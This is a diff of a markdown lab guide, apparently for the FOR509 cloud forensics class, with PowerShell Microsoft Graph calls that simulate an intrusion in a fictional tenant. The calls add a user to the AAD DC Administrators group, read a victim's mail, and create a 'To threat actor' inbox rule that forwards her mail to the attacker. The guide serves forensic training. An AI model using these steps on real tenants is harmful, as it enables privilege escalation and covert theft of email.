@@ -10,13 +10,17 @@ To issue this Graph API calls, you must have an existing application defined and
 
 
 ***Install the authentication library PowerShell module***
+
     ```
     Install-Module -Name MSAL.PS -RequiredVersion 4.2.1.3 -Scope CurrentUser
     ```
+    
     For more information, see https://www.powershellgallery.com/packages/MSAL.PS/4.2.1.3
 
 ***Request a token***  
+
 Prior to issuing a Graph API call, you must request a token. This code will be at the start of your session and must be re-issued once the token expires.
+
     ```
     $tenantId = "<name of your tenant>"
     $clientID = "<application id>"
@@ -31,7 +35,9 @@ Prior to issuing a Graph API call, you must request a token. This code will be a
     ```
 
 ***Create a user***  
+
     Permissions required: `User.ReadWrite.All` and `Directory.ReadWrite.All`
+
     ```
     $apiUri = "https://graph.microsoft.com/v1.0/users"
     $usr = @{
@@ -51,6 +57,7 @@ Prior to issuing a Graph API call, you must request a token. This code will be a
     ```
 
 ***Get list of users***
+
     ```
     $apiUri = "https://graph.microsoft.com/v1.0/users/"
     $response = Invoke-RestMethod -Headers $Headers -Uri $apiUri -Method GET
@@ -59,6 +66,7 @@ Prior to issuing a Graph API call, you must request a token. This code will be a
     ```
 
 Sample output from the FOR509 class. You will need the id of your targeted user for future steps.
+
     ```
     displayName    userPrincipalName          id
     -----------    -----------------          --
@@ -68,6 +76,7 @@ Sample output from the FOR509 class. You will need the id of your targeted user 
     ```
 
 ***Get list of groups***
+
     ```
     $apiUri = "https://graph.microsoft.com/v1.0/groups"
     $response = Invoke-RestMethod -Headers $Headers -Uri $apiUri -Method GET
@@ -76,6 +85,7 @@ Sample output from the FOR509 class. You will need the id of your targeted user 
     ```
 
 Sample output from the FOR509 class. You will need the id of the targeted group.
+
     ```
     displayName           id
     -----------           --
@@ -88,6 +98,7 @@ Sample output from the FOR509 class. You will need the id of the targeted group.
     ```
 
 ***Add Hydra@pymtechlabs.com to the AAD DC Administrators group***
+
     ```
     $body = [ordered]@{
     "@odata.id"="https://graph.microsoft.com/v1.0/users/Hydra@pymtechlabs.com"
@@ -98,7 +109,9 @@ Sample output from the FOR509 class. You will need the id of the targeted group.
     ```
 
 ***Get list of Janet's email***  
+
 Permission required: `Mail.Read`
+
     ```
     $apiUri = "https://graph.microsoft.com/v1.0/users/76362af6-e38a-41e7-adab-e21ad7e23a20/messages"
     $response = Invoke-RestMethod -Headers $Headers -Uri $apiUri -Method GET
@@ -109,7 +122,9 @@ Permission required: `Mail.Read`
     ```
 
 ***Create a calendar event in Janet's calendar***  
+
 Permission required: `Calendars.ReadWrite`
+
     ```
     $body = @{
         "subject"="FOR509 Class"
@@ -146,6 +161,7 @@ Permission required: `Calendars.ReadWrite`
     ```
 
 ***List calendar events***
+
     ```
     $apiUri = "https://graph.microsoft.com/v1.0/users/76362af6-e38a-41e7-adab-e21ad7e23a20/calendar/events"
     $response = Invoke-RestMethod -Headers $Headers -Uri $apiUri -Method GET
@@ -154,7 +170,9 @@ Permission required: `Calendars.ReadWrite`
     ```
 
 ***Create a contact***  
+
 Permission required: `Contacts.ReadWrite`
+
     ```
     $body = @{
         "givenName"="Pierre"
@@ -172,6 +190,7 @@ Permission required: `Contacts.ReadWrite`
     ```
 
 ***List contacts to make sure the new contact was created***
+ 
     ```
     $apiUri = "https://graph.microsoft.com/v1.0/users/76362af6-e38a-41e7-adab-e21ad7e23a20/contacts"
     $response = Invoke-RestMethod -Headers $Headers -Uri $apiUri -Method GET
@@ -180,7 +199,9 @@ Permission required: `Contacts.ReadWrite`
     ```
 
 ***Create a message rule to forward Janet's email sent by Hank to Hydra's email***  
+
 Permission required: `MailboxSettings.ReadWrite`
+
     ```
     $body = @{
         "displayName"="To threat actor"
@@ -209,6 +230,7 @@ Permission required: `MailboxSettings.ReadWrite`
     ```
 
 ***List rules to verify the new rule was created***
+
     ```
     $apiUri = "https://graph.microsoft.com/v1.0/users/76362af6-e38a-41e7-adab-e21ad7e23a20/mailFolders/inbox/messageRules"
     $response = Invoke-RestMethod -Headers $Headers -Uri $apiUri -Method GET
@@ -216,6 +238,7 @@ Permission required: `MailboxSettings.ReadWrite`
     ```
 
 ***Change profile picture (must be less than 100kb)***  
+
     ```
     $UPN="Hydra@pymtechlabs.com"
     $Photo="C:\pictures\hydra.jpg"
